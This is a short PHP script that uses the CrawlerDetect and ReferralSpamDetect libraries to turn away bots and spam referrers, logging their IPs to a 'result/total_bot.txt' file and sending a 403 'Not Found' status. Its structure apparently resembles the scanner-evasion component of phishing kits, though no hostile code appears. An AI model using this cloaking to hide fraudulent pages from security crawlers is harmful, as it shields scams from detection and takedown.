<?php
require 'CrawlerDetect/Fixtures/AbstractProvider.php';
require 'CrawlerDetect/Fixtures/AbstractReff.php';
require 'CrawlerDetect/Fixtures/Crawlers.php';
require 'CrawlerDetect/Fixtures/Exclusions.php';
require 'CrawlerDetect/Fixtures/Headers.php';
require 'CrawlerDetect/Fixtures/Headerspam.php';
require 'CrawlerDetect/Fixtures/SpamReferrers.php';
require 'CrawlerDetect/CrawlerDetect.php';
require 'CrawlerDetect/ReferralSpamDetect.php';
use Jaybizzle\CrawlerDetect\CrawlerDetect;
use Jaybizzle\ReferralSpamDetect\ReferralSpamDetect;

if($setting['block_crawler'] == "on") {
	$CrawlerDetect = new CrawlerDetect;
	$referrer = new ReferralSpamDetect;

	if($CrawlerDetect->isCrawler()) {
		$ip = getUserIP();
	    tulis_file("result/total_bot.txt", "$ip|Bot Crawler"."\n");

	    header("status: 403 Not Found");
	            exit();
	}
	if($referrer->isReferralSpam()) {
		$ip = getUserIP();
	    tulis_file("result/total_bot.txt", "$ip|Referrer Block"."\n");
	    header("status: 403 Not Found");
	            exit();
	}
}

